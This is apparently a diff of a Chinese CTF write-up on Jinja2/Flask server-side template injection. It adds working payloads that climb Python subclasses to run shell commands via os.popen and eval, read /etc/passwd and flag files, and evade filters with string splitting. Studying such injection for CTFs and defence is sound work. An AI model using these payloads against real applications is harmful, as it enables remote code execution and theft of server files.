@@ -90,15 +90,51 @@ your input <class 'object'>
 /test?name={{''.__class__.__base__.__subclasses__()}}
 回显:
 your input object基类的子类
+即我们可以利用的类。
 ```
-注入操作：
-大多数题目的flag均藏在系统中的某个文件内
-```
-{{[].__class__.__base__.__subclasses__()[122]('E:/flag.php').read()}}
 
-{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
+^
+## **利用**
+若经过{{''.__class__.__base__.__subclasses__()}}查询存在的类和位置后，可以借助的类反射调用方法：
 ```
-绕过
+<class 'warnings.catch_warnings'>，没有内置os模块可能在第59位。
+<class 'site._Printer'> 内含os模块（不需要import os） ，可能在第71位，可以借助这些类来执行命令。
+_io.TextIOWrapper 可以文件读取，可能在122位。
+```
+
+大多数题目的flag均藏在系统中的某个文件内。
+
+1、warnings.catch_warnings类利用：
+```
+目录查询
+{{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
+读取目录flask
+{{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls /flasklight').read()")}}
+读取flag
+{{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('cat /flasklight/coomme_geeeett_youur_flek ').read()")}}
+
+一般
+{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
+```
+
+2、site._Printer类利用：
+```
+目录查询
+{{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()}}
+ 本来想直接用listdir('/')，但这里listdir同样被ban了
+读取目录flasklight
+{{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls /flasklight').read()}}
+读取flag
+{{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('cat coomme_geeeett_youur_flek').read()}
+```
+
+3、_io.TextIOWrapper类利用：
+```
+{{[].__class__.__base__.__subclasses__()[122]('/flag').read()}}
+```
+
+^
+## **绕过**
 ```
 * `request.__class__`
 * `request["__class__"]`
